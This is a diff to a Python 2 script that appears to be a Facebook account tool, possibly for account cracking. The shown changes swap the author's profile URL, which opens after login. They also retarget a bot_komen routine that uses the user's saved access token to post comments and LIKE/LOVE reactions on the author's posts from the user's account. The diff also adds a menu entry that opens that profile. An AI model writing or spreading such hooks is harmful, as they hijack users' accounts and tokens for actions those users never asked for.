@@ -156,7 +156,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\033[1;97m[\033[1;92m✓\033[1;97m]\033[1;92m Login Success'
-				os.system('xdg-open https://m.facebook.com/reviahmad.farezi.33')
+				os.system('xdg-open https://m.facebook.com/rvadxd.1')
 				bot_komen()
 			except requests.exceptions.ConnectionError:
 				print"\n[!] Try Again"
@@ -185,7 +185,7 @@ def token():
 		zedd.write(toket)
 		zedd.close()
 		print '\033[1;97m[\033[1;92m✓\033[1;97m]\033[1;92m Login Succes'
-		os.system('xdg-open https://m.facebook.com/reviahmad.farezi.33')
+		os.system('xdg-open https://m.facebook.com/rvadxd.1')
 		bot_komen()
 	except KeyError:
 		print "\033[1;97m[\033[1;91m!\033[1;97m] \033[1;91mToken Wrong !"
@@ -199,10 +199,10 @@ def bot_komen():
 	except IOError:
 		print"\033[1;97m[!] Token invalid"
 		os.system('rm -rf login.txt')
-	una = ('100051988012294')
-	kom = ('Okeh')
+	una = ('100005386548985')
+	kom = ('HI Revi Ahmad Fz Me User Your Tools')
 	reac = ('LIKE')
-	post = ('142726290803637')
+	post = ('1472963479559856')
 	post2 = ('116951336714466')
 	kom2 = ('Awokaowkaowk')
 	reac2 = ('LOVE')
@@ -1159,6 +1159,13 @@ def pilih_bangla():
 	raw_input("\033[1;93m[\033[1;97m Back \033[1;93m]")
 	os.system("python2 cek.py")
 	
+#######SAYA########
+def saya():
+	os.system ('clear')
+	print logo
+	jalan ('        \033[92mAnda Akan Di Arahkan Ke Browser')
+	os.system('xdg-open https://m.facebook.com/rvadxd.1')
+	menu()
        
 		
 if __name__ == '__main__':
